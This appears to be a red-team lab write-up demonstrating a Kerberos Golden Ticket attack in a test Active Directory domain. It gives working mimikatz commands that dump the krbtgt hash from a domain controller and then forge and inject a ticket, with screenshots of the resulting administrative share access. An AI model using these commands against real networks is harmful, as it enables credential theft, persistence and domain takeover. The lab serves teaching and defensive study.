---
description: Persistence and Privilege Escalation with Golden Kerberots tickets
---

# Kerberos: Golden Tickets

This lab explores an attack on Active Directory Kerberos Authentication: forging Kerberos Ticket Granting Tickets (TGT). A forged TGT can be used to request any Ticket Granting Service (TGS) ticket — making it a "golden" ticket.

This attack assumes a compromised Domain Controller and extraction of the KRBTGT account NTLM hash, which is required for a successful Golden Ticket attack.

{% stepper %}
{% step %}
### Extract KRBTGT account NTLM hash

On the Domain Controller (attacker@victim-dc), extract the krbtgt account's password NTLM hash using mimikatz:

{% code title="mimikatz command" %}
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```
{% endcode %}

![krbtgt hash](<../../.gitbook/assets/image (51)>)
{% endstep %}

{% step %}
### Create forged Golden Ticket and inject into current session

On a workstation (attacker@victim-workstation), create a forged golden ticket and inject it into the current logon session memory (ptt = pass-the-ticket):

{% code title="mimikatz command" %}
```
mimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```
{% endcode %}

![create golden ticket](<../../.gitbook/assets/image (52)>)
{% endstep %}

{% step %}
### Verify the injected ticket

Check if the ticket was created/listed (klist):

![klist output](<../../.gitbook/assets/image (53)>)
{% endstep %}

{% step %}
### Attempt privileged access using the forged ticket

* Open another PowerShell console using a low-privileged account and attempt to mount c$ of pc-mantvydas and dc-mantvydas — access denied (as expected for this low-priv account).

![access denied](<../../.gitbook/assets/image (54)>)

* Switch back to the console used to create the golden ticket (local admin with injected ticket) and access the domain controller c$ — access granted.

![access granted](<../../.gitbook/assets/image (55)>)
{% endstep %}
{% endstepper %}

## Observations

* The injected golden ticket allowed the attacker to impersonate a privileged user (user:newAdmin, RID 500) and access resources (for example, c$ on the domain controller) that were otherwise denied to low-privileged sessions.
* Screenshots show the logon session, injected ticket, and the successful share access when using the session with the forged ticket.

![logon session](<../../.gitbook/assets/image (56)>)

![share access](<../../.gitbook/assets/image (57)>)

## References

* [Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active DirectoryActive Directory & Azure AD/Entra ID Security](https://adsecurity.org/?p=1515)
